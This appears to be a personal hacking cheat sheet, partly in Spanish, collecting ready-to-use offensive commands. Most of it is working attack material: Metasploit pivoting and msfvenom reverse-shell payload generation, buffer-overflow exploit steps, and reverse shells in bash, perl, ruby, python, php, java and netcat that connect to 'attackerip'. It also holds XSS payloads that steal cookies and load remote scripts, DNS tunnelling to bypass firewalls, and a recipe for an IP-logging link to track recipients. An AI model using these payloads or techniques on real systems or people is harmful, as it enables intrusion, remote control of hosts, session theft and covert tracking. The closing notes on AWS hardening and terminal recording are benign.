# https://www.offensive-security.com/metasploit-unleashed/pivoting/

    meterpreter > ipconfig
    IP Address : 10.1.13.3
    meterpreter > run autoroute -s 10.1.13.0/24
    meterpreter > run autoroute -p
    10.1.13.0 255.255.255.0 Session 1
    meterpreter > Ctrl+Z
    msf auxiliary(tcp) > use exploit/windows/smb/psexec
    msf exploit(psexec) > set RHOST 10.1.13.2
    msf exploit(psexec) > exploit
    meterpreter > ipconfig
    IP Address : 10.1.13.2

# Exploit-DB based on CSV file

    searchsploit –-update
    searchsploit apache 2.2
    searchsploit “Linux Kernel”
    # para bajar el sploit a tu hdd
        searchsploit -m
    # para ver el sploit
        searchsploit -x

    man searchsploit

    It is in kali!

    cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep “<|<=” | sort -k3

# MSF Payloads

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local IP Address> X > system.exe
    msfvenom -p php/meterpreter/reverse_tcp LHOST=<local IP Address> LPORT=<local port> R > exploit.php
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local IP Address> LPORT=<local port> -e -a x86 –platform win -f asp -o file.asp
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local IP Address> LPORT=<local port> -e x86/shikata_ga_nai -b “\x00” -a x86 –platform win -f c

# MSF generates the Meterpreter Shell that bounces under Linux
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<local port> -e -f elf -a x86 –platform linux -o shell

# MSF build bounce Shell (C Shellcode)
    msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=<local port> -b “\x00\x0a\x0d” -a x86 –platform win -f c

# MSF generates a bounce Python Shell
    msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=<local port> -o shell.py

# MSF builds rebound ASP Shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 –platform win -o shell.asp

# MSF generates bounce shells
    msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh

# MSF build bounces PHP Shell
    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
    add <?php at the beginning
    perl -i~ -0777pe’s/^/<?php \n/’ shell.php

# MSF generates bounce Win Shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 –platform win -o shell.exe

# Linux commonly used security commands

    find / -uid 0 -perm -4000
    find / -perm -o=w
    find / -name ” ” -print
    find / -name “..” -print
    find / -name “. ” -print
    find / -name ” ” -print
    find / -nouser

    lsof +L1

    lsof -i

    arp -a

    getent passwd

    getent group

    for user in $(getent passwd|cut -f1 -d:); do echo “### Crontabs for $user ####”; crontab -u $user -l; done

    cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=’|fold -w 12| head -n 4

    find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
    chattr -i file

# Windows Buffer Overflow exploits

    msfvenom -p windows/shell_bind_tcp -a x86 –platform win -b “\x00” -f c
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 –platform win -e x86/shikata_ga_nai -b “\x00” -f c

# COMMONLY USED BAD CHARACTERS:

    \x00\x0a\x0d\x20 For http request
    \x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c Ending with (0\n\r_)

# Regular command:
    pattern create
    pattern offset (EIP Address)
    pattern offset (ESP Address)
    add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

    !pvefindaddr pattern_create 5000
    !pvefindaddr suggest
    !pvefindaddr nosafeseh


    !mona config -set workingfolder C:\Mona\%p

    !mona config -get workingfolder
    !mona mod
    !mona bytearray -b “\x00\x0a”
    !mona pc 5000
    !mona po EIP
    !mona suggest

# SEH – Structured exception handling

Note: SEH (“Structured Exception Handling”), or structured exception handling, is a powerful processor error or exception weapon provided by the Windows operating system to the programmer.

    # https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
    # http://baike.baidu.com/view/243131.htm
    !mona suggest
    !mona nosafeseh
    nseh=”\xeb\x06\x90\x90″ (next seh chain)
    iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)

# ROP (DEP)

Note: ROP (“Return-Oriented Programming”) is a computer security exploit technology that allows an attacker to execute code, such as un-executable memory and code signatures, in a security defense situation.

DEP (“Data Execution Prevention”) is a set of hardware and software technology, in memory, strictly to distinguish between code and data to prevent the data as code execution.

    # https://en.wikipedia.org/wiki/Return-oriented_programming
    # https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B
    # https://en.wikipedia.org/wiki/Data_Execution_Prevention
    # http://baike.baidu.com/item/DEP/7694630
    !mona modules
    !mona ropfunc -m *.dll -cpb “\x00\x09\x0a”
    !mona rop -m *.dll -cpb “\x00\x09\x0a” (auto suggest)

# ASLR – Address space format randomization
    # https://en.wikipedia.org/wiki/Address_space_layout_randomization
    !mona noaslr
# A Tool using Shodan and RTSP to find vulnerable cameras around the world.

    https://github.com/spicesouls/basilisk

# EGG Hunter technology

Egg hunting This technique can be categorized as a “graded shellcode”, which basically supports you to find your actual (larger) shellcode (our “egg”) with a small, specially crafted shellcode, In search of our final shellcode. In other words, a short code executes first, then goes to the real shellcode and executes it. – Making reference to see Ice Forum , more details can be found in the code I add comments link.

    # https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
    # http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf
    # http://www.fuzzysecurity.com/tutorials/expDev/4.html
    !mona jmp -r esp
    !mona egg -t lxxl
    \xeb\xc4 (jump backward -60)
    buff=lxxllxxl+shell
    !mona egg -t ‘w00t’

# GDB Debugger commonly used commands

    break *_start
    next
    step
    n
    s
    continue
    c

# Data
    checking ‘REGISTERS’ and ‘MEMORY’

# Display the register values: (Decimal,Binary,Hex)
    print /d –> Decimal
    print /t –> Binary
    print /x –> Hex
    O/P :
    (gdb) print /d $eax
    $17 = 13
    (gdb) print /t $eax
    $18 = 1101
    (gdb) print /x $eax
    $19 = 0xd
    (gdb)

# Display the value of a specific memory address
    command : x/nyz (Examine)
    n –> Number of fields to display ==>
    y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
    z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)

# BASH rebound Shell

    bash -i >& /dev/tcp/X.X.X.X/443 0>&1

    exec /bin/bash 0&0 2>&0
    exec /bin/bash 0&0 2>&0

    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

    exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
    exec 5<>/dev/tcp/attackerip/4444

    cat <&5 | while read line; do $line 2>&5 >&5; done # or:
    while read line 0<&5; do $line 2>&5 >&5; done

    /bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
    /bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1

# PERL rebound Shell

    perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:443″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’

# Win platform
    perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
    perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

# RUBY rebound Shell

    ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’

# Win platform
    ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
    ruby -rsocket -e ‘f=TCPSocket.open(“attackerip”,”443″).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’

# PYTHON rebound Shell

    python -c ‘import                                                 socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“attackerip”,443));os.dup2(s.fileno(),0);                 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

# PHP bounce Shell

    php -r ‘$sock=fsockopen(“attackerip”,443);exec(“/bin/sh -i <&3 >&3 2>&3”);’

# JAVA rebound Shell

    r = Runtime.getRuntime()
    p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
    p.waitFor()

# NETCAT rebound Shell

    nc -e /bin/sh attackerip 4444
    nc -e /bin/sh 192.168.37.10 443

# If the -e parameter is disabled, you can try the following command
    # mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
    /bin/sh | nc attackerip 443
    rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/

# If you installed the wrong version of netcat, try the following command
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f

    TELNET rebound Shell

# If netcat is not available
    mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe

    XTERM rebound Shell

# Enable the X server (: 1 – listen on TCP port 6001)

    apt-get install xnest
    Xnest :1

# Remember to authorize the connection from the target IP
    xterm -display 127.0.0.1:1
# Grant access
    xhost +targetip

# Connect back to our X server on the target machine
    xterm -display attackerip:1
    /usr/openwin/bin/xterm -display attackerip:1
    or
    DISPLAY=attackerip:0 xterm

# XSS

    # https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
    (“< iframes > src=http://IP:PORT </ iframes >”)

    <script>document.location=http://IP:PORT</script>

    ‘;alert(String.fromCharCode(88,83,83))//\’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//\”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

    “;!–”<XSS>=&amp;amp;{()}

    <IMG SRC=”javascript:alert(‘XSS’);”>
    <IMG SRC=javascript:alert(‘XSS’)>
    <IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>””>
    <IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>

    <IMG                     SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
    <IMG SRC=”jav ascript:alert(‘XSS’);”>

    perl -e ‘print “<IMG SRC=javascript:alert(\”XSS\”)>”;’ > out

    <BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>

    (“>< iframes http://google.com < iframes >)

    <BODY BACKGROUND=”javascript:alert(‘XSS’)”>
    <FRAMESET><FRAME SRC=”javascript:alert(‘XSS’);”></FRAMESET>
    “><script >alert(document.cookie)</script>
    %253cscript%253ealert(document.cookie)%253c/script%253e
    “><s”%2b”cript>alert(document.cookie)</script>
    %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
    <img src=asdf onerror=alert(document.cookie)>

    SSH Over SCTP (using Socat)

    socat SCTP-LISTEN:80,fork TCP:localhost:22
    socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
    ssh -lusername localhost -D 8080 -p 1337

# Metagoofil – Metadata collection tool

    Note: Metagoofil is a tool for collecting information using Google.

    > metagoofil -w -d 150.107.31.61 -t doc,pdf -l 200 -n 50 -o examplefiles-northernrich
    [*] Downloaded files will be saved here: examplefiles-northernrich
    [*] Searching for 200 .doc files and waiting 30.0 seconds between searches
    [*] Searching for 200 .pdf files and waiting 30.0 seconds between searches
    [+] Total download: 0 bytes / 0.00 KB / 0.00 MB
    [+] Done!


# Use a DNS tunnel to bypass the firewall

    https://github.com/iagox86/dnscat2

    apt install dnscat

    or

    apt-get update
    apt-get -y install ruby-dev git make g++
    gem install bundler
    git clone https://github.com/iagox86/dnscat2.git
    cd dnscat2/server
    bundle install
    ruby ./dnscat2.rb
    dnscat2> New session established: 16059
    dnscat2> session -i 16059

    https://downloads.skullsecurity.org/dnscat2/
    https://github.com/lukebaggett/dnscat2-powershell

    dnscat –host <dnscat server_ip>

    # Temporary phone number and sms, USA/Canada only

    https://es.freephonenum.com

# Create an imageLogger.

    1) upload an image to es.imgbb.com
    2) get the url
    3) create a link on iplogger.com
        alternatives
        https://www.iplocation.net/ip-lookup
        https://ipinfo.io/account/search
    4) get the url
    5) create a link at https://www.shorturl.at/shortener.php

    You already have the link to send.

    You can see the ip at iplogger.com

# Encrypt/decrypt and more. Created by UK's intelligence, security and cyber agency.

    https://gchq.github.io/CyberChef

# AWS

    Despliegue en la nube.
    Ver los documentos adjuntos cherrytree (despligue entorno nube) y pdf Secure account setup.

    Otro documento muy importante relacionado con la seguridad es como calcular el minimo conjunto de permisos para un usuario IAM.

        https://aws.amazon.com/blogs/security/techniques-for-writing-least-privilege-iam-policies/

        https://www.udemy.com/course/curso-profesional-de-hacking-etico-y-ciberseguridad/learn/lecture/29899772#overview

        A lo mejor no quieres dedicar dinero a AWS y quieres ir contra tu máquina, puedes usar localstack

            https://www.youtube.com/watch?v=GBLPi-mno7M

    Aplicar el sentido común, a los servidores que estén conectados a un balanceador de carga solo se podrá acceder a traves del grupo de
    seguridad del balanceador de carga, nada de exponer las conexiones entrantes ssh y http a todo internet (0.0.0.0/0).
    De igual manera, las bases de datos conectadas a esos servidores, solo se puede acceder desde lo expuesto en el grupo de seguridad de dichos
    servidores de aplicaciones.

    Al final, de lo que se trata es que solo puedas acceder a la infraestructura desde el balanceador de carga, la consola de administración
    de AWS y poco más.

    Idealmente en el grupo de seguridad del balanceador de carga solo permitirias conexiones entrantes desde un grupo de ips muy restringidas,
    las de los administradores de dicha infraestructura.

# Localstack

    Pendiente

# asciinema

    si necesitas grabar una sesión de tu terminal y subirla a una nube pública

    > asciinema rec
    asciinema: recording asciicast to /tmp/tmpfdj8yt89-ascii.cast
    asciinema: press <ctrl-d> or type "exit" when you're done
    ..............                                     kali@kali
                ..,;:ccc,.                             ---------
              ......''';lxO.                           OS: Kali GNU/Linux Rolling x86_64                                                                                                                          
    .....''''..........,:ld;                           Host: VMware Virtual Platform None                                                                                                                         
               .';;;:::;,,.x,                          Kernel: 5.18.0-kali5-amd64                                                                                                                                 
          ..'''.            0Xxoc:,.  ...              Uptime: 3 hours, 10 mins                                                                                                                                   
      ....                ,ONkc;,;cokOdc',.            Packages: 4178 (dpkg)                                                                                                                                      
     .                   OMo           ':ddo.          Shell: zsh 5.9                                                                                                                                             
                        dMc               :OO;         Resolution: 1680x1050                                                                                                                                      
                        0M.                 .:o.       DE: Xfce 4.16                                                                                                                                              
                        ;Wd                            WM: Xfwm4                                                                                                                                                  
                         ;XO,                          WM Theme: Kali-Dark                                                                                                                                        
                           ,d0Odlc;,..                 Theme: Adwaita-dark [GTK2/3]                                                                                                                               
                               ..',;:cdOOd::,.         Icons: Flat-Remix-Blue-Dark [GTK2/3]                                                                                                                       
                                        .:d;.':;.      Terminal: asciinema                                                                                                                                        
                                           'd,  .'     CPU: Intel i9-9980HK (4) @ 2.400GHz                                                                                                                        
                                             ;l   ..   GPU: 00:0f.0 VMware SVGA II Adapter                                                                                                                        
                                              .o       Memory: 4012MiB / 7920MiB                                                                                                                                  
    > ok, i am recording a session
    zsh: command not found: ok,
    > i am done
    zsh: command not found: i
    > exit
    asciinema: recording finished
    asciinema: press <enter> to upload to asciinema.org, <ctrl-c> to save locally

    View the recording at:

        https://asciinema.org/a/mOTeXHPTdvmdSye0NvMgS53t4


     ⭐  ~/CheatSheetsHacking  ok  took 34s  at 12:54:49 >

# Load Balancing detector

    https://www.kali.org/tools/lbd/

    Sospechas que una app está detrás de un balanceador de carga?
    Ojo que genera un montón de tráfico, si lo haces contra uno de AWS, GCP o Azure, probablemente lo detecten y carguen
    un buen dinero...

    > lbd www.topethmine.com

    lbd - load balancing detector 0.4 - Checks if a given domain uses load-balancing.
                                        Written by Stefan Behte (http://ge.mine.nu)
                                        Proof-of-concept! Might give false positives.

    Checking for DNS-Loadbalancing: NOT FOUND
    Checking for HTTP-Loadbalancing [Server]:
     NOT FOUND

    Checking for HTTP-Loadbalancing [Date]: , No date header found, skipping.

    Checking for HTTP-Loadbalancing [Diff]:

    NOT FOUND

    www.topethmine.com does NOT use Load-balancing.

    >
    >

    ⭐  ~/CheatSheetsHacking  ok  at 12:53:28 >
    
 # Scraping redes sociales
 
    https://github.com/bellingcat/snscrape